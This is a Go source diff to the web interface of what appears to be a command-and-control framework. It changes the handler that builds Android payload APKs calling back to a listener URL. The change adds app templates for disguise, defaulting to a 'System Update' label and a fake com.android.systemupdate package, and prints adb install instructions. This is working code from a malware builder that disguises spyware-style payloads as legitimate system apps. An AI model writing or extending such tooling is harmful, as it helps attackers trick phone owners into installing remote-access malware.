@@ -115,18 +115,22 @@ func (w *WebUI) handlePayloadGenerate(rw http.ResponseWriter, r *http.Request) {
 		json.NewEncoder(rw).Encode(resp)
 
 	case "android":
-		// Try to build a ready-to-install APK first
-		apkPath, err := payloads.BuildAndroidAPK(req.ListenerURL, "build/payloads")
+		// Try to build a ready-to-install APK — uses template if app_template is set
+		apkPath, err := payloads.BuildAndroidAPKWithTemplate(req.ListenerURL, "build/payloads", req.AppTemplate)
 		if err == nil {
 			info, _ := os.Stat(apkPath)
 			size := "unknown"
 			if info != nil {
 				size = fmt.Sprintf("%.1f KB", float64(info.Size())/1024)
 			}
-			AddPayloadRecord("android", filepath.Base(apkPath), apkPath, size, req.ListenerURL)
+			templateLabel := "System Update"
+			if req.AppTemplate != "" {
+				templateLabel = req.AppTemplate
+			}
+			AddPayloadRecord("android-"+templateLabel, filepath.Base(apkPath), apkPath, size, req.ListenerURL)
 			json.NewEncoder(rw).Encode(PayloadResponse{
 				Success:  true,
-				Message:  fmt.Sprintf("Android APK built: %s (%s)\nInstall: adb install %s\nLaunch: adb shell am start -n com.android.systemupdate/.MainActivity", apkPath, size, apkPath),
+				Message:  fmt.Sprintf("Android APK built: %s (%s)\nTemplate: %s\nInstall: adb install %s", apkPath, size, templateLabel, apkPath),
 				Filename: filepath.Base(apkPath),
 				FilePath: apkPath,
 				Size:     size,
